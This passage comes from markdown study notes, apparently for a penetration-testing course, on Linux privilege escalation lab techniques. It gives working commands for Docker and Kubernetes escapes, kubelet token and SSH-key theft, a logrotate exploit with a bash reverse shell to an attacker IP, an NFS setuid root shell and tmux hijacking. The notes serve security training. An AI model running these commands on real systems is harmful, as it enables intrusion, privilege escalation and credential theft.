writable, then we can still use this case to escalate our privileges.\n\nDocker\n\n```shell-session\ndocker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash\n\nroot@ubuntu:~# ls -l\n\ntotal 68\nlrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Sep 22 11:34 boot\ndrwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom\ndrwxr-xr-x  19 root root  3940 Oct 24 13:28 dev\ndrwxr-xr-x 100 root root  4096 Sep 22 13:27 etc\ndrwxr-xr-x   3 root root  4096 Sep 22 11:06 home\nlrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32\ndrwx------   2 root root 16384 Oct  6  2021 lost+found\ndrwxr-xr-x   2 root root  4096 Oct 24 13:28 media\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 mnt\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 opt\ndr-xr-xr-x 307 root root     0 Oct 24 13:28 proc\ndrwx------   6 root root  4096 Sep 26 21:11 root\ndrwxr-xr-x  28 root root   920 Oct 24 13:32 run\nlrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin\ndrwxr-xr-x   7 root root  4096 Oct  7  2021 snap\ndrwxr-xr-x   2 root root  4096 Apr 23  2020 srv\ndr-xr-xr-x  13 root root     0 Oct 24 13:28 sys\ndrwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp\ndrwxr-xr-x  14 root root  4096 Sep 22 11:11 usr\ndrwxr-xr-x  13 root root  4096 Apr 23  2020 var\n\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/16-Kubernetes",
    "path": "02_CPTS/16-Linux Privilege Escalation/16-Kubernetes.md",
    "title": "16 Kubernetes",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Kubernetes, also known as K8s, stands out as a revolutionary technology that has had a significant impact on the software development landscape. This platform has completely transformed the proces...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n[Kubernetes](https://kubernetes.io/), also known as `K8s`, stands out as a revolutionary technology that has had a significant impact on the software development landscape. This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.\n\nDeveloped by Google, Kubernetes leverages over a decade of experience in running complex workloads. As a result, it has become a critical tool in the DevOps universe for microservices orchestration. Since its creation, Kubernetes has been donated to the [Cloud Native Computing Foundation](https://www.cncf.io/), where it has become the industry's gold standard. Understanding the security aspects of K8 containers is crucial. We will probably be able to access one of the many containers during our penetration test.\n\nOne of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications. As a result, Kubernetes has become a go-to solution for organizations looking to streamline their development processes and improve efficiency.\n\nKubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches. The K8s architecture comprises a `master node` and `worker nodes`, each with specific roles.\n\n---\n\n## K8s Concept\n\nKubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.\n\nDifferences between K8 and Docker\n\n|**Function**|**Docker**|**Kubernetes**|\n|---|---|---|\n|`Primary`|Platform for containerizing Apps|An orchestration tool for managing containers|\n|`Scaling`|Manual scaling with Docker swarm|Automatic scaling|\n|`Networking`|Single network|Complex network with policies|\n|`Storage`|Volumes|Wide range of storage options|\n\nKubernetes architecture is primarily divided into two types of components:\n\n- `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster\n    \n- `The Worker Nodes` (minions), where the containerized applications are run\n    \n\n#### Nodes\n\nThe master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.\n\nIt covers versatility in accommodating various needs, such as supporting databases, AI/ML workloads, and cloud-native microservices. Additionally, it's capable of managing high-resource applications at the edge and is compatible with different platforms. Therefore, it can be utilized on public cloud services like Google Cloud, Azure, and AWS or within private on-premises data centers.\n\n#### Control Plane\n\nThe Control Plane serves as the management layer. It consists of several crucial components, including:\n\n|**Service**|**TCP Ports**|\n|---|---|\n|`etcd`|`2379`, `2380`|\n|`API server`|`6443`|\n|`Scheduler`|`10251`|\n|`Controller Manager`|`10252`|\n|`Kubelet API`|`10250`|\n|`Read-Only Kubelet API`|`10255`|\n\nThese elements enable the `Control Plane` to make decisions and provide a comprehensive view of the entire cluster.\n\n#### Minions\n\nWithin a containerized environment, the `Minions` (worker nodes) serve as the designated location for running applications. It's important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.\n\nThe `Scheduler`, based on the `API server`, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the `etcd`.\n\nUnderstanding how these components interact is essential for grasping the functioning of Kubernetes. The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.\n\n#### K8's Security Measures\n\nKubernetes security can be divided into several domains:\n\n- Cluster infrastructure security\n- Cluster configuration security\n- Application security\n- Data security\n\nEach domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.\n\n---\n\n## Kubernetes API\n\nThe core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions. The Kubernetes API has been designed to support declarative control, allowing users to define their desired state for the system. This enables Kubernetes to take the necessary steps to implement the desired state. The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system's state. These requests can involve creating, modifying, deleting, and retrieving information related to various resources within the system. Overall, the Kubernetes API plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.\n\nWithin the Kubernetes framework, an API resource serves as an endpoint that houses a specific collection of API objects. These objects pertain to a particular category and include essential elements such as Pods, Services, and Deployments, among others. Each unique resource comes equipped with a distinct set of operations that can be executed, including but not limited to:\n\n|**Request**|**Description**|\n|---|---|\n|`GET`|Retrieves information about a resource or a list of resources.|\n|`POST`|Creates a new resource.|\n|`PUT`|Updates an existing resource.|\n|`PATCH`|Applies partial updates to a resource.|\n|`DELETE`|Removes a resource.|\n\n#### Authentication\n\nIn terms of authentication, Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity. Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`). This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources. Therefore, Kubernetes' authentication and authorization process is a comprehensive security measure that ensures only authorized users can access resources and perform operations.\n\nIn Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.\n\n#### K8's API Server Interaction\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k\n\n{\n\t\"kind\": \"Status\",\n\t\"apiVersion\": \"v1\",\n\t\"metadata\": {},\n\t\"status\": \"Failure\",\n\t\"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\n\t\"reason\": \"Forbidden\",\n\t\"details\": {},\n\t\"code\": 403\n}\n```\n\n`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a `403 Forbidden` status code accordingly.\n\n#### Kubelet API - Extracting Pods\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .\n\n...SNIP...\n{\n  \"kind\": \"PodList\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"items\": [\n    {\n      \"metadata\": {\n        \"name\": \"nginx\",\n        \"namespace\": \"default\",\n        \"uid\": \"aadedfce-4243-47c6-ad5c-faa5d7e00c0c\",\n        \"resourceVersion\": \"491\",\n        \"creationTimestamp\": \"2023-07-04T10:42:02Z\",\n        \"annotations\": {\n          \"kubectl.kubernetes.io/last-applied-configuration\": \"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"nginx\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"image\\\":\\\"nginx:1.14.2\\\",\\\"imagePullPolicy\\\":\\\"Never\\\",\\\"name\\\":\\\"nginx\\\",\\\"ports\\\":[{\\\"containerPort\\\":80}]}]}}\\n\",\n          \"kubernetes.io/config.seen\": \"2023-07-04T06:42:02.263953266-04:00\",\n          \"kubernetes.io/config.source\": \"api\"\n        },\n        \"managedFields\": [\n          {\n            \"manager\": \"kubectl-client-side-apply\",\n            \"operation\": \"Update\",\n            \"apiVersion\": \"v1\",\n            \"time\": \"2023-07-04T10:42:02Z\",\n            \"fieldsType\": \"FieldsV1\",\n            \"fieldsV1\": {\n              \"f:metadata\": {\n                \"f:annotations\": {\n                  \".\": {},\n                  \"f:kubectl.kubernetes.io/last-applied-configuration\": {}\n                }\n              },\n              \"f:spec\": {\n                \"f:containers\": {\n                  \"k:{\\\"name\\\":\\\"nginx\\\"}\": {\n                    \".\": {},\n                    \"f:image\": {},\n                    \"f:imagePullPolicy\": {},\n                    \"f:name\": {},\n                    \"f:ports\": {\n\t\t\t\t\t...SNIP...\n```\n\nThe information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.\n\nUnderstanding the container images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them to gain unauthorized access to the system. Namespace information can provide insights into how the pods and resources are arranged within the cluster, which we can use to target specific namespaces with known vulnerabilities. We can also use metadata such as `uid` and `resourceVersion` to perform reconnaissance and recognize potential targets for further attacks. Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.\n\nWe can further analyze the pods with the following command:\n\n#### Kubeletctl - Extracting Pods\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods\n\n┌────────────────────────────────────────────────────────────────────────────────┐\n│                                Pods from Kubelet                               │\n├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤\n│   │ POD                                │ NAMESPACE   │ CONTAINERS              │\n├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤\n│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │\n│   │                                    │             │                         │\n├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤\n│ 2 │ nginx                              │ default     │ nginx                   │\n│   │                                    │             │                         │\n├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤\n│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │\n│   │                                    │             │                         │\n├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤\n```\n\nTo effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.\n\n#### Kubelet API - Available Commands\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce\n\n┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐\n│                                   Node with pods vulnerable to RCE                                  │\n├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤\n│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │\n├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤\n│   │              │                                    │             │                         │ RUN │\n├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤\n│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │\n├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤\n│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │\n├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤\n```\n\nIt is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.\n\n#### Kubelet API - Executing Commands\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec \"id\" -p nginx -c nginx\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nThe output of the command shows that the current user executing the `id` command inside the container has root privileges. This indicates that we have gained administrative access within the container, which could potentially lead to privilege escalation vulnerabilities. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.\n\n---\n\n## Privilege Escalation\n\nTo gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.\n\n#### Kubelet API - Extracting Tokens\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p nginx -c nginx | tee -a k8.token\n\neyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw\n```\n\n#### Kubelet API - Extracting Certificates\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" -p nginx -c nginx | tee -a ca.crt\n\n-----BEGIN CERTIFICATE-----\nMIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p\n<SNIP>\nMhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD\n602eXnhZAL3+dA==\n-----END CERTIFICATE-----\n```\n\nNow that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.\n\n#### List Privileges\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ export token=`cat k8.token`\ncry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list\n\nResources\t\t\t\t\t\t\t\t\t\tNon-Resource URLs\tResource Names\tVerbs \nselfsubjectaccessreviews.authorization.k8s.io\t\t[]\t\t\t\t\t[]\t\t\t\t[create]\nselfsubjectrulesreviews.authorization.k8s.io\t\t[]\t\t\t\t\t[]\t\t\t\t[create]\npods\t\t\t\t\t\t\t\t\t\t\t[]\t\t\t\t\t[]\t\t\t\t[get create list]\n...SNIP...\n```\n\nHere we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:\n\n#### Pod YAML\n\nCode: yaml\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privesc\n  namespace: default\nspec:\n  containers:\n  - name: privesc\n    image: nginx:1.14.2\n    volumeMounts:\n    - mountPath: /root\n      name: mount-root-into-mnt\n  volumes:\n  - name: mount-root-into-mnt\n    hostPath:\n       path: /\n  automountServiceAccountToken: true\n  hostNetwork: true\n```\n\nOnce created, we can now create the new pod and check if it is running as expected.\n\n#### Creating a new Pod\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml\n\npod/privesc created\n\n\ncry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods\n\nNAME\tREADY\tSTATUS\tRESTARTS\tAGE\nnginx\t1/1\t\tRunning\t0\t\t\t23m\nprivesc\t1/1\t\tRunning\t0\t\t\t12s\n```\n\nIf the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.\n\n#### Extracting Root's SSH Key\n\nKubernetes\n\n```shell-session\ncry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec \"cat /root/root/.ssh/id_rsa\" -p privesc -c privesc\n\n-----BEGIN OPENSSH PRIVATE KEY-----\n...SNIP...\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/17-Logrotate",
    "path": "02_CPTS/16-Linux Privilege Escalation/17-Logrotate.md",
    "title": "17 Logrotate",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called logrotate takes care of archiving or disposing of old logs. If no attention is paid...",
    "category": "02_CPTS",
    "content": "\n---\n\nEvery Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.\n\n`Logrotate` has many features for managing these log files. These include the specification of:\n\n- the `size` of the log file,\n- its `age`,\n- and the `action` to be taken when one of these factors is reached.\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ man logrotate\ndrxh3kr@htb[/htb]$ # or\ndrxh3kr@htb[/htb]$ logrotate --help\n\nUsage: logrotate [OPTION...] <configfile>\n  -d, --debug               Don't do anything, just test and print debug messages\n  -f, --force               Force file rotation\n  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')\n  -s, --state=statefile     Path of state file\n      --skip-state-lock     Do not lock the state file\n  -v, --verbose             Display messages during rotation\n  -l, --log=logfile         Log file or 'syslog' to log to syslog\n      --version             Display version information\n\nHelp options:\n  -?, --help                Show this help message\n      --usage               Display brief usage message\n```\n\nThe function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.\n\nThis tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/logrotate.conf\n\n\n# see \"man logrotate\" for details\n\n# global options do not affect preceding include directives\n\n# rotate log files weekly\nweekly\n\n# use the adm group by default, since this is the owning group\n# of /var/log/syslog.\nsu root adm\n\n# keep 4 weeks worth of backlogs\nrotate 4\n\n# create new (empty) log files after rotating old ones\ncreate\n\n# use date as a suffix of the rotated file\n#dateext\n\n# uncomment this if you want your log files compressed\n#compress\n\n# packages drop log rotation information into this directory\ninclude /etc/logrotate.d\n\n# system-specific logs may also be configured here.\n```\n\nTo force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo cat /var/lib/logrotate.status\n\n/var/log/samba/log.smbd\" 2022-8-3\n/var/log/mysql/mysql.log\" 2022-8-3\n```\n\nWe can find the corresponding configuration files in `/etc/logrotate.d/` directory.\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls /etc/logrotate.d/\n\nalternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp\n```\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/logrotate.d/dpkg\n\n/var/log/dpkg.log {\n        monthly\n        rotate 12\n        compress\n        delaycompress\n        missingok\n        notifempty\n        create 644 root root\n}\n```\n\nTo exploit `logrotate`, we need some requirements that we have to fulfill.\n\n1. we need `write` permissions on the log files\n2. logrotate must run as a privileged user or `root`\n3. vulnerable versions:\n    - 3.8.6\n    - 3.11.0\n    - 3.15.0\n    - 3.18.0\n\nThere is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.\n\nLogrotate\n\n```shell-session\nlogger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git\nlogger@nix02:~$ cd logrotten\nlogger@nix02:~$ gcc logrotten.c -o logrotten\n```\n\nNext, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.\n\nLogrotate\n\n```shell-session\nlogger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload\n```\n\nHowever, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.\n\nLogrotate\n\n```shell-session\nlogger@nix02:~$ grep \"create\\|compress\" /etc/logrotate.conf | grep -v \"#\"\n\ncreate\n```\n\nIn our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.\n\nAfter that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.\n\nLogrotate\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nlvp 9001\n\nListening on 0.0.0.0 9001\n```\n\nAs a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.\n\nLogrotate\n\n```shell-session\nlogger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log\n```\n\nLogrotate\n\n```shell-session\n...\nListening on 0.0.0.0 9001\n\nConnection received on 10.129.24.11 49818\n# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/18-Miscellaneous Techniques",
    "path": "02_CPTS/16-Linux Privilege Escalation/18-Miscellaneous Techniques.md",
    "title": "18 Miscellaneous Techniques",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Passive Traffic Capture If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as ...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Passive Traffic Capture\n\nIf `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.\n\n---\n\n## Weak NFS Privileges\n\nNetwork File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.\n\nMiscellaneous Techniques\n\n```shell-session\ndrxh3kr@htb[/htb]$ showmount -e 10.129.2.12\n\nExport list for 10.129.2.12:\n/tmp             *\n/var/nfs/general *\n```\n\nWhen an NFS volume is created, various options can be set:\n\n|Option|Description|\n|---|---|\n|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|\n|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ cat /etc/exports\n\n# /etc/exports: the access control list for filesystems which may be exported\n#\t\tto NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/var/nfs/general *(rw,no_root_squash)\n/tmp *(rw,no_root_squash)\n```\n\nFor example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.\n\nFirst, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ cat shell.c \n\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <stdlib.h>\n\nint main(void)\n{\n  setuid(0); setgid(0); system(\"/bin/bash\");\n}\n```\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:/tmp$ gcc shell.c -o shell\n```\n\nMiscellaneous Techniques\n\n```shell-session\nroot@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt\nroot@Pwnbox:~$ cp shell /mnt\nroot@Pwnbox:~$ chmod u+s /mnt/shell\n```\n\nWhen we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:/tmp$  ls -la\n\ntotal 68\ndrwxrwxrwt 10 root  root   4096 Sep  1 06:15 .\ndrwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..\ndrwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix\ndrwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix\n-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell\n<SNIP>\n```\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:/tmp$ ./shell\nroot@NIX02:/tmp# id\n\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)\n```\n\n---\n\n## Hijacking Tmux Sessions\n\nTerminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ tmux -S /shareds new -s debugsess\nhtb@NIX02:~$ chown root:devs /shareds\n```\n\nIf we can compromise a user in the `devs` group, we can attach to this session and gain root access.\n\nCheck for any running `tmux` processes.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$  ps aux | grep tmux\n\nroot      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess\n```\n\nConfirm permissions.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ ls -la /shareds \n\nsrw-rw---- 1 root devs 0 Sep  1 06:27 /shareds\n```\n\nReview our group membership.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ id\n\nuid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)\n```\n\nFinally, attach to the `tmux` session and confirm root privileges.\n\nMiscellaneous Techniques\n\n```shell-session\nhtb@NIX02:~$ tmux -S /shareds\n\nid\n\nuid=0(root) gid=0(root) groups=0(root)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/19-Kernel Exploits",
    "path": "02_CPTS/16-Linux Privilege Escalation/19-Kernel Exploits.md",
    "title": "19 Kernel Exploits",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is Dirty COW (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root p...",
    "category": "02_CPTS",
    "content": "\n---\n\nKernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits. It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.\n\nPrivilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command `uname -a` and search Google for the kernel version.\n\nNote: Kernel exploits can cause system instability so use caution when running these against a production system.\n\n---\n\n## Kernel Exploit Example\n\nLet's start by checking the Kernel level and Linux OS version.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ uname -a\n\nLinux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nKernel 